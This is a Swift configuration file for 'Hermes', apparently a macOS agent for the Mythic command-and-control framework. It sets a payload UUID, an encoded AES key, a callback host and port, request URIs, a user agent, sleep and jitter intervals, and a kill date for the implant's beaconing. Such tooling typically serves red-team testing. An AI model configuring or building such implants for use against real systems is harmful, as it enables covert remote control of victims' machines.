//
//  config.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//

import Foundation

struct AgentConfig {
    // Mythic components
    var payloadUUID: String
    var encodedAESKey: String
    
    // C2 components
    var callbackHost: String
    var getRequestURI: String
    var postRequestURI: String
    var callbackPort: Int
    var userAgent: String
    var hostHeader: String
    var useSSL: Bool
    var queryParameter: String
    var httpHeaders: Dictionary<String,String>
    
    // Agent components
    var sleep: Int32
    var jitter: Int32
    var killDate: String //year-month-day, ex. 1994-01-05
}

var agentConfig = AgentConfig(
    payloadUUID: "01a9424f-033c-436e-b7c4-67436c7a0ee5",
    encodedAESKey: "FBlJqxjb2z/N7hOjEJ/cbdTU5n0WJCUldZF/F4SNKk4=",

    callbackHost: "192.168.196.129",
    getRequestURI: "/index",
    postRequestURI: "/data",
    callbackPort: 443,
    userAgent: "Hermes user agent",
    hostHeader: "",
    useSSL: true,
    queryParameter: "q",
    httpHeaders: ["key1":"value1","key2":"value2"],

    sleep: 5,
    jitter: 5,
    killDate: "2022-05-01"
)
